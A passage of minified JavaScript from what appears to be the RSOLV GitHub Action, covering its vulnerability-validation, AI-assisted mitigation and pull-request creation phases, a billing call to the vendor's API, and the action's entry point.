This is attempt ${Y+1} of ${W}.`}}testGeneratingAnalyzer;gitBasedValidator;maxIterations;testRunner;testDiscovery;testIntegrator;githubClient;validationTimeout;async executeValidateStandalone(X){try{if(V.info(`[VALIDATE-STANDALONE] Processing ${X.issues?.length} issues`),!X.issues||X.issues.length===0)return{success:!1,phase:"validate",error:"No issues provided for validation"};let Q=[];for(let W of X.issues)try{let G=null;if(X.usePriorScan)G=(await this.phaseDataClient.retrievePhaseResults(`${W.repository.owner}/${W.repository.name}`,W.number,this.getCurrentCommitSha()))?.scan;if(!G){let M=await Q8(W,this.config);G={analysisData:{...M,canBeFixed:M?.canBeFixed||!1},canBeFixed:M?.canBeFixed||!1,usedPriorScan:!1}}if(!("canBeFixed"in G?G.canBeFixed:!0)){V.info(`[VALIDATE] Skipping issue #${W.number} - cannot be automatically fixed`),Q.push({issueNumber:W.number,validated:!1,canBeFixed:!1,reason:"Issue cannot be automatically fixed",usedPriorScan:"usedPriorScan"in G?G.usedPriorScan:!1,timestamp:new Date().toISOString()});continue}let{ValidationMode:$}=await Promise.resolve().then(() => (ZG(),qG)),z=new $(this.config,process.cwd());V.info(`[VALIDATE-STANDALONE] Using ValidationMode for issue #${W.number}`);let U=await z.validateVulnerability(W,G&&"analysisData"in G?G.analysisData:void 0),K=null;if(X.runTests&&this.testRunner&&U.redTests)try{K=await this.testRunner.runTests(U.redTests),V.info(`Test execution result: ${K.redTestPassed?"PASSED":"FAILED"}`)}catch(M){V.warn(`Test execution failed for issue #${W.number}:`,M)}let B=null;if(this.testDiscovery){if(B=await this.testDiscovery.findExistingTests(W.repository),B.hasTests&&U.redTests){if(V.info(`Found existing test framework: ${B.framework}`),X.integrateTests&&this.testIntegrator)try{let M=await this.testIntegrator.integrateTests(U.redTests,B);V.info(`Test integration result: ${M.integrated}`)}catch(M){V.warn(`Test integration failed: ${M}`)}}}let q="analysisData"in G?G.analysisData:void 0,Z={issueNumber:W.number,validated:U.validated,branchName:U.branchName,redTests:U.redTests,testResults:U.testResults,falsePositive:!U.validated&&!U.infrastructureFailure&&!U.noTestFramework&&!U.validationInconclusive,infrastructureFailure:!U.validated&&!!U.infrastructureFailure,noTestFramework:!U.validated&&!!U.noTestFramework,validationInconclusive:!U.validated&&!!U.validationInconclusive,testType:U.testType,cweId:U.cweId,framework:U.framework,retryCount:U.retryCount,classificationSource:U.classificationSource,falsePositiveReason:U.falsePositiveReason,existingTests:B?.hasTests,testFramework:B?.framework,usedPriorScan:"usedPriorScan"in G?G.usedPriorScan:!1,timestamp:U.timestamp,commitHash:U.commitHash,hasSpecificVulnerabilities:U.validated,vulnerabilities:U.vulnerabilities||[],confidence:U.validated?"high":"low",analysisData:q?{vulnerabilityType:q.vulnerabilityType,severity:q.severity,cwe:q.cwe,issueType:q.issueType,isAiGenerated:q.isAiGenerated}:void 0};if(await this.phaseDataClient.storePhaseResults("validate",{validate:{[W.number]:Z}},{repo:`${W.repository.owner}/${W.repository.name}`,issueNumber:W.number,commitSha:this.getCurrentCommitSha()}),X.postComment&&this.githubClient){let M=this.formatValidationComment(W,Z);await this.githubClient.createIssueComment(W.repository.owner,W.repository.name,W.number,M)}try{let{addLabels:M,removeLabel:L}=await Promise.resolve().then(() => (g9(),r7));if(Z.validated){if(V.info(`[VALIDATE] Adding 'rsolv:validated' label to issue #${W.number}`),await M(W.repository.owner,W.repository.name,W.number,["rsolv:validated"]),W.labels&&W.labels.includes("rsolv:detected"))V.info(`[VALIDATE] Removing 'rsolv:detected' label from issue #${W.number}`),await L(W.repository.owner,W.repository.name,W.number,"rsolv:detected")}else if(Z.noTestFramework)V.info(`[VALIDATE] Adding 'rsolv:validation-unavailable' label to issue #${W.number} (no test framework)`),await M(W.repository.owner,W.repository.name,W.number,["rsolv:validation-unavailable"]);else if(Z.validationInconclusive)V.info(`[VALIDATE] Static-only test for issue #${W.number}  validation-inconclusive (label already applied by validation-mode)`);else if(Z.infrastructureFailure)V.info(`[VALIDATE] Adding 'rsolv:validation-inconclusive' label to issue #${W.number} (infrastructure limitation)`),await M(W.repository.owner,W.repository.name,W.number,["rsolv:validation-inconclusive"]);else if(Z.falsePositive){if(V.info(`[VALIDATE] Adding 'rsolv:false-positive' label to issue #${W.number}`),await M(W.repository.owner,W.repository.name,W.number,["rsolv:false-positive"]),W.labels&&W.labels.includes("rsolv:detected"))V.info(`[VALIDATE] Removing 'rsolv:detected' label from issue #${W.number}`),await L(W.repository.owner,W.repository.name,W.number,"rsolv:detected")}}catch(M){V.warn(`[VALIDATE] Failed to update labels for issue #${W.number}:`,M)}Q.push(Z)}catch(G){V.error(`Failed to validate issue #${W.number}:`,G);let H=this.generateFallbackTests(W);Q.push({issueNumber:W.number,testGenerationFailed:!0,fallbackTests:!0,generatedTests:H,error:G instanceof Error?G.message:String(G)})}let J=null;if(X.format)J=this.generateValidationReport(Q,X.format);let Y=Q.some((W)=>W.validated!==!1&&!W.testGenerationFailed&&W.canBeFixed!==!1);if(X.issues.length===1){let W=Q[0];return{success:W.validated!==!1&&W.canBeFixed!==!1&&!W.testGenerationFailed,phase:"validate",message:W.canBeFixed===!1?"Issue cannot be automatically fixed":W.testGenerationFailed?"Test generation failed":`Validation completed for issue #${X.issues[0].number}`,data:{validation:W,report:J},error:W.testGenerationFailed?W.error:void 0}}return{success:Y,phase:"validate",message:`Validated ${Q.length} issues`,data:{validations:Q,report:J,annotations:X.format==="github-actions"?this.generateGitHubAnnotations(Q):void 0}}}catch(Q){return V.error("[VALIDATE-STANDALONE] Failed",Q),{success:!1,phase:"validate",error:Q instanceof Error?Q.message:String(Q)}}}async generateValidationTests(X,Q){let{analysisData:J}=Q;if(this.testGeneratingAnalyzer||this.config.testGeneration?.enabled){let Y=this.testGeneratingAnalyzer||new C5({provider:"anthropic",apiKey:this.config.aiProvider.apiKey,model:this.config.aiProvider.model,temperature:0.2,maxTokens:this.config.aiProvider.maxTokens,useVendedCredentials:this.config.aiProvider.useVendedCredentials}),W=await this.getCodebaseFiles(J),H=(await Y.analyzeWithTestGeneration(X,this.config,W)).generatedTests;return{generatedTests:{success:H?.success??!0,...H,redTest:H?.tests?.[0]?.testCode||"should fail when vulnerability exists",greenTest:H?.tests?.[1]?.testCode||"should pass when vulnerability is fixed",refactorTest:H?.tests?.[2]?.testCode||"should maintain original functionality"},...Q}}return{generatedTests:this.generateFallbackTests(X),...Q}}async getCodebaseFiles(X){let Q=new Map;if(X?.filesToModify&&X.filesToModify.length>0){let J=(await import("fs")).default,Y=(await import("path")).default;for(let W of X.filesToModify)try{let G=Y.resolve(process.cwd(),W);if(J.existsSync(G)){let H=J.readFileSync(G,"utf8");Q.set(W,H)}}catch(G){V.warn(`Could not read file ${W}:`,G)}}return Q}generateFallbackTests(X){return{success:!1,redTest:`// RED Test: Should fail when ${X.title} exists`,greenTest:`// GREEN Test: Should pass when ${X.title} is fixed`,refactorTest:"// REFACTOR Test: Should maintain functionality after fix"}}formatValidationComment(X,Q){return`## Validation Results

**Issue #${X.number}**: ${X.title}

### Test Generation
-  RED test generated (proves vulnerability exists)
-  GREEN test generated (validates fix)
-  REFACTOR test generated (ensures functionality preserved)

${Q.falsePositive?`###  Possible False Positive
Tests pass on current code - vulnerability may not exist.`:""}

${Q.testExecutionFailed?`###  Test Execution Failed
Tests were generated but could not be executed automatically.`:""}

### Next Steps
${Q.falsePositive?`1. Review the generated tests
2. Close issue if false positive confirmed`:`1. Review the generated tests
2. Run mitigation mode to apply fix
3. Tests will validate the fix automatically`}
`}generateValidationReport(X,Q){switch(Q){case"markdown":return this.generateMarkdownReport(X);case"json":return JSON.stringify({issues:X},null,2);case"github-actions":return this.generateGitHubActionsReport(X);default:return JSON.stringify(X)}}generateMarkdownReport(X){let Q=`# Validation Report

`;for(let J of X)Q+=`## Issue #${J.issueNumber}

`,Q+=J.falsePositive?`**Status**:  Possible False Positive

`:`**Status**:  Validated

`,Q+=`### Generated Tests
`,Q+=`- RED test: Generated
`,Q+=`- GREEN test: Generated
`,Q+=`- REFACTOR test: Generated

`;return Q}generateGitHubActionsReport(X){return X.map((Q)=>`::${Q.falsePositive?"warning":"notice"} ::Issue #${Q.issueNumber} validated`).join(`
`)}generateGitHubAnnotations(X){return X.map((Q)=>`::warning file=unknown,line=1::Issue #${Q.issueNumber} - ${Q.falsePositive?"Possible false positive":"Validation complete"}`)}async executeMitigateStandalone(X){try{if(V.info(`[MITIGATE-STANDALONE] Starting mitigation for ${X.issues?.length||1} issues`),!X.issues||X.issues.length===0)if(X.repository&&X.issueNumber){let $=await this.phaseDataClient.retrievePhaseResults(`${X.repository.owner}/${X.repository.name}`,X.issueNumber,await this.getCurrentCommitSha());if(!$?.validation&&!$?.validate)return{success:!1,phase:"mitigate",error:"No validation data available for mitigation"};let z={id:`issue-${X.issueNumber}`,number:X.issueNumber,title:"Issue from prior validation",body:"",labels:[],assignees:[],repository:{...X.repository,fullName:`${X.repository.owner}/${X.repository.name}`,defaultBranch:X.repository.defaultBranch||"main"},source:"github",createdAt:new Date().toISOString(),updatedAt:new Date().toISOString(),metadata:{}};X.issues=[z],X.validationData=$}else return{success:!1,phase:"mitigate",error:"No issues provided for mitigation"};let Q=X.validationData;if(!Q&&X.usePriorValidation){Q={validation:{}};for(let $ of X.issues){let z=await this.phaseDataClient.retrievePhaseResults($.repository.fullName,$.number,await this.getCurrentCommitSha());if(z?.validation)Object.assign(Q.validation,z.validation);else if(z?.validate)Object.assign(Q.validation,z.validate)}}if(!Q||Object.keys(Q.validation||{}).length===0)if(X.generateTestsIfMissing){V.info("[MITIGATE-STANDALONE] No validation data, generating tests...");let $=await this.executeValidateStandalone(X);if(!$.success)return{success:!1,phase:"mitigate",error:"Failed to generate validation tests"};Q=$.data}else return{success:!1,phase:"mitigate",error:"No validation data provided or found"};if(!this.config.aiProvider)return{success:!1,phase:"mitigate",error:"AI provider not configured"};let J={},Y=!0,W=!1;for(let $ of X.issues){let z=$.number,U,K=Q.validation||Q.validate;if(K){if(K[z])U=K[z];else if(K[`issue-${$.number}`])U=K[`issue-${$.number}`];else if(K.issueNumber===$.number)U=K}if(!U){V.warn(`[MITIGATE-STANDALONE] No validation data for issue #${$.number}`),J[z]={success:!1,error:"No validation data for this issue"},Y=!1;continue}try{let B=this.mitigateIssue($,U,X),q=X.timeout||1800000,Z=await Promise.race([B,new Promise((M,L)=>setTimeout(()=>L(Error("Mitigation timeout")),q))]);if(J[z]=Z,!Z.success)Y=!1;else W=!0}catch(B){V.error(`[MITIGATE-STANDALONE] Failed to mitigate issue #${$.number}:`,B),J[z]={success:!1,error:B instanceof Error?B.message:"Unknown error"},Y=!1}}let G,H;if(X.format==="markdown")G=this.generateMitigationMarkdownReport(J);else if(X.format==="json")H={mitigations:Object.entries(J).map(([$,z])=>({issue:$,...typeof z==="object"&&z!==null?z:{result:z}}))};return await this.phaseDataClient.storePhaseResults("mitigate",{mitigate:J},{repo:X.issues[0].repository.fullName,issueNumber:X.issues.length===1?X.issues[0].number:void 0,commitSha:await this.getCurrentCommitSha()}),{success:Y,phase:"mitigate",message:!Y&&W?"Partial success":void 0,data:{mitigation:J,testsGenerated:X.generateTestsIfMissing},report:G,jsonReport:H}}catch(Q){return V.error("[MITIGATE-STANDALONE] Unexpected error:",Q),{success:!1,phase:"mitigate",error:Q instanceof Error?Q.message:"Unknown error"}}}async mitigateIssue(X,Q,J){let Y;if(V.info(`[MITIGATE] Checking credential manager requirements: useVendedCredentials=${this.config.aiProvider?.useVendedCredentials}, rsolvApiKey=${this.config.rsolvApiKey?"present":"missing"}`),this.config.aiProvider?.useVendedCredentials&&this.config.rsolvApiKey){V.info("[MITIGATE] Initializing credential manager for vended credentials");let{CredentialManagerSingleton:U}=await Promise.resolve().then(() => (RX(),K7));try{Y=await U.getInstance(this.config.rsolvApiKey),V.info("[MITIGATE] Credential manager initialized successfully")}catch(K){throw V.error("[MITIGATE] Failed to initialize credential manager:",K),Error(`Credential initialization failed: ${K instanceof Error?K.message:String(K)}`)}}else V.warn(`[MITIGATE] Skipping credential manager initialization - useVendedCredentials: ${this.config.aiProvider?.useVendedCredentials}, hasApiKey: ${!!this.config.rsolvApiKey}`);let W=K8({repoPath:process.cwd(),credentialManager:Y,useVendedCredentials:this.config.aiProvider?.useVendedCredentials,maxTurns:3,model:this.config.aiProvider?.model,testFilePatterns:["test/","tests/","spec/","__tests__/",".test.",".spec."],verbose:!1}),G=0,H=J.maxRetries||3,$,z=null;while(G<H){G++;try{let U=await W.generateSolutionWithGit(X,{summary:"Security issue fix",complexity:"medium",estimatedTime:30,potentialFixes:["Apply security fix"],recommendedApproach:"Fix security vulnerability"},void 0,Q.generatedTests);if(V.info(`[MITIGATE] Solution generated with commitHash: ${U.commitHash||"UNDEFINED"}`),!U.success){let K=U.error||U.message||"Unknown error";if(V.warn(`[MITIGATE] Solution generation returned success=false: ${K}`),z?.commitHash)V.info(`[MITIGATE] Using previously stored solution with commitHash: ${z.commitHash}`),Object.assign(U,{success:!0,commitHash:z.commitHash,filesModified:z.filesModified,diffStats:z.diffStats});else if(G<H){V.info(`[MITIGATE] Retrying solution generation (attempt ${G}/${H})`);continue}else throw Error(`Solution generation failed: ${K}`)}if(U.success&&U.commitHash)z=U,V.info(`[MITIGATE] Storing successful solution with commitHash: ${U.commitHash}`);else if(!U.commitHash&&z?.commitHash){if(V.info(`[MITIGATE] Using previously stored commitHash: ${z.commitHash}`),U.commitHash=z.commitHash,!U.filesModified&&z.filesModified)U.filesModified=z.filesModified;if(!U.diffStats&&z.diffStats)U.diffStats=z.diffStats}if(!U.commitHash)throw V.error("[MITIGATE] No commitHash available - solution did not create any commits"),Error("No commitHash available - solution did not create any commits");if(J.runTests){let{runTests:K}=await Promise.resolve().then(() => (US(),zS));if(!(await K(Q.generatedTests?.tests||[])).passed){if(G<H){V.info(`[MITIGATE] Tests failed, retrying (attempt ${G}/${H})`);continue}throw Error("Tests failed after fix")}}if(J.refactorStyle)V.info("[MITIGATE] Refactoring code to match codebase style");if(J.createPR){let K=await this.createMitigationPR(X,U,Q,J);return{success:!0,issueNumber:X.number,prUrl:K.url,prCreated:!0,prType:J.prType||"standard",testsPass:!0,refactored:J.refactorStyle||!1,attempts:G}}return{success:!0,issueNumber:X.number,fixCommit:U.commitHash,testsPass:!0,refactored:J.refactorStyle||!1,attempts:G}}catch(U){if($=U,U instanceof Error&&U.message.includes("Test environment"))throw U;if(G>=H)break}}return{success:!1,issueNumber:X.number,error:$?.message||"Failed to mitigate",attempts:G}}async createMitigationPR(X,Q,J,Y){if(Y.prType==="educational"){V.info("[MITIGATE] Creating educational PR with comprehensive security education");let H=(B)=>{return B.match(/\s*(.+?)\s+vulnerabilit/i)?.[1]},$=J.analysisData?.vulnerabilityType||Q.summary?.vulnerabilityType||H(X.title)||"security";V.info(`[MITIGATE] Educational PR vulnerability type: "${$}" (from: ${J.analysisData?.vulnerabilityType?"analysisData":Q.summary?.vulnerabilityType?"solution.summary":H(X.title)?"issue.title":"fallback"})`);let z={title:`Fix: ${X.title}`,description:Q.summary?.description||X.body||"Security fix applied",vulnerabilityType:$,severity:J.analysisData?.severity||Q.summary?.severity||"medium",cwe:J.analysisData?.cwe||Q.summary?.cwe,tests:J.tests||Q.summary?.tests,isAiGenerated:!0,isTestMode:process.env.RSOLV_TESTING_MODE==="true"},U=Q.diffStats||Q.summary?.diffStats,K=await VJ(X,Q.commitHash,z,this.config,U,J);if(!K.success)throw Error(`Educational PR creation failed: ${K.error||K.message}`);return V.info("[MITIGATE] Educational PR created successfully",{prUrl:K.pullRequestUrl,prNumber:K.pullRequestNumber}),{url:K.pullRequestUrl,number:K.pullRequestNumber,educationalContent:K.educationalContent}}let{createPullRequest:W}=await Promise.resolve().then(() => (jS(),MS)),G=`## Security Fix for Issue #${X.number}

`;if(G+=`### ${X.title}

`,Y.includeBeforeAfter)G+="### Before\n```javascript\n// Vulnerable code\n```\n\n",G+="### After\n```javascript\n// Fixed code\n```\n\n";return W({repository:X.repository.fullName,commitSha:Q.commitHash,issueNumber:X.number,title:`Fix: ${X.title}`,body:G,base:X.repository.defaultBranch})}generateMitigationMarkdownReport(X){let Q=`## Mitigation Report

`;for(let[J,Y]of Object.entries(X)){let W=J.replace("issue-","");if(Q+=`### Issue #${W}
`,Y.success){if(Q+=` Fixed
`,Y.prUrl)Q+=`- PR: ${Y.prUrl}
`;if(Y.testsPass)Q+=`- Tests: Passing
`}else Q+=` Failed: ${Y.error}
`;Q+=`
`}return Q}_setTestDependencies(X){if(process.env.RSOLV_TESTING_MODE!=="true")throw Error("_setTestDependencies can only be called in test environment");if(X.scanner)this.scanner=X.scanner;if(X.validationMode)this.validationMode=X.validationMode}}y1();async function FS(X,Q){if(V.info("RFC-091: Starting billing mode"),V.info(`PR Context: ${Q.owner}/${Q.repo}#${Q.prNumber}`),!Q.merged)return V.info("PR not merged, skipping billing"),{success:!0,message:"PR not merged - no billing needed",skipped:!0,reason:"PR not merged"};let J=await B10(X,Q);if(!J)return V.info("No fix attempt found for this PR, skipping"),{success:!0,message:"No RSOLV fix attempt tracked for this PR",skipped:!0,reason:"No fix attempt found"};return V.info(`Found fix attempt ID: ${J.id}`),await q10(X,J.id)}async function B10(X,Q){let J=new URL("/api/v1/fix-attempts",X.apiUrl);J.searchParams.set("github_org",Q.owner),J.searchParams.set("repo_name",Q.repo),J.searchParams.set("pr_number",Q.prNumber.toString()),V.debug(`Looking up fix attempt: ${J.toString()}`);try{let Y=await fetch(J.toString(),{method:"GET",headers:{"x-api-key":X.apiKey,"Content-Type":"application/json"}});if(!Y.ok){if(Y.status===404)return null;return V.warn(`Fix attempt lookup failed: ${Y.status}`),null}let W=await Y.json();if(W.id)return{id:W.id};if(Array.isArray(W)&&W.length>0&&W[0].id)return{id:W[0].id};if(W.fix_attempts&&W.fix_attempts.length>0)return{id:W.fix_attempts[0].id};return null}catch(Y){return V.error("Failed to lookup fix attempt",Y),null}}async function q10(X,Q){let J=`${X.apiUrl}/api/v1/fix-attempts/${Q}/billing`;V.info(`Calling billing endpoint: POST ${J}`);try{let Y=await fetch(J,{method:"POST",headers:{"x-api-key":X.apiKey,"Content-Type":"application/json"}});if(!Y.ok){let H=await Y.text();return V.error(`Billing request failed: ${Y.status} - ${H}`),{success:!1,message:`Billing request failed: ${Y.status}`,fixAttemptId:Q}}let W=await Y.json(),G=W.message?.includes("Already")||W.billing_status==="billed";if(G)V.info("Fix attempt already billed (idempotent)");else V.info(`Billing processed: ${W.billing_status||"processing"}`);return{success:!0,message:G?"Already billed":"Billing processed",billingStatus:W.billing_status,fixAttemptId:Q}}catch(Y){return V.error("Billing request failed",Y),{success:!1,message:`Billing request error: ${Y instanceof Error?Y.message:String(Y)}`,fixAttemptId:Q}}}function OS(){let X=process.env.GITHUB_EVENT_PATH;if(!X)return V.warn("GITHUB_EVENT_PATH not set"),null;try{let Q=O0("fs"),J=JSON.parse(Q.readFileSync(X,"utf8"));if(!J.pull_request)return V.warn("Event payload does not contain pull_request"),null;let Y=J.pull_request,W=Y.base?.repo||J.repository;return{owner:W?.owner?.login||process.env.GITHUB_REPOSITORY?.split("/")[0]||"",repo:W?.name||process.env.GITHUB_REPOSITORY?.split("/")[1]||"",prNumber:Y.number,merged:Y.merged===!0,mergedAt:Y.merged_at,mergedBy:Y.merged_by?.login,mergeCommitSha:Y.merge_commit_sha}}catch(Q){return V.error("Failed to parse GitHub event",Q),null}}async function Z10(){try{if(process.env.TARGET_REPOSITORY)V.info(`TARGET_REPOSITORY override: ${process.env.TARGET_REPOSITORY} (was: ${process.env.GITHUB_REPOSITORY})`),process.env.GITHUB_REPOSITORY=process.env.TARGET_REPOSITORY;V.info("Starting RSOLV action v2.0 - Enhanced Logging Active"),V.info(`Build timestamp: ${new Date().toISOString()}`);let X=await f2();V.info("Configuration loaded successfully");let Q=SB();if(V.info(`Execution mode: ${Q} - ${EB(Q)}`),Q==="billing"){let J=OS();if(!J)return{success:!1,message:"Failed to get PR context from event. Billing mode requires pull_request event."};let Y=await FS({apiUrl:process.env.RSOLV_API_URL||"https://api.rsolv.dev",apiKey:X.rsolvApiKey||""},J);if(process.env.GITHUB_OUTPUT){let W=await import("fs"),G=process.env.GITHUB_OUTPUT;if(W.appendFileSync(G,`billing_status=${Y.billingStatus||"unknown"}
`),W.appendFileSync(G,`billing_skipped=${Y.skipped||!1}
`),Y.fixAttemptId)W.appendFileSync(G,`fix_attempt_id=${Y.fixAttemptId}
`)}return{success:Y.success,message:Y.message}}if(Q==="scan"||Q==="validate"||Q==="mitigate"||Q==="full"){let J=new TV(X),Y=process.env.GITHUB_REPOSITORY;if(!Y)throw Error("GITHUB_REPOSITORY environment variable not set");let[W,G]=Y.split("/"),H=await A4(W,G),$=await J.execute(Q,{repository:{owner:W,name:G,defaultBranch:H.defaultBranch||"main"},issueNumber:process.env.RSOLV_ISSUE_NUMBER?parseInt(process.env.RSOLV_ISSUE_NUMBER):void 0,createPR:X.createPR,prType:process.env.RSOLV_EDUCATIONAL_PR!=="false"?"educational":"standard"});if(process.env.GITHUB_OUTPUT){let z=await import("fs"),U=process.env.GITHUB_OUTPUT;if($.data)z.appendFileSync(U,`phase_results=${JSON.stringify($)}
`);if(Q==="scan"&&$.data){let K=$.data,B=K.scan||K;if(B.createdIssues)z.appendFileSync(U,`created_issues=${JSON.stringify(B.createdIssues)}
`),z.appendFileSync(U,`issues_created=${B.createdIssues.length}
`);if(B.vulnerabilities)z.appendFileSync(U,`scan_results=${JSON.stringify(B.vulnerabilities)}
`),z.appendFileSync(U,`security_findings=${JSON.stringify(B.vulnerabilities)}
`)}}return{success:$.success,message:$.message||`${Q} phase completed`}}throw Error(`Unsupported mode: ${Q}. Supported modes: scan, validate, mitigate, full, billing`)}catch(X){return V.error("Action failed",X),{success:!1,message:`RSOLV action failed: ${X instanceof Error?X.message:String(X)}`}}}Z10().then((X)=>{if(X.success)process.exit(0);else process.exit(1)});
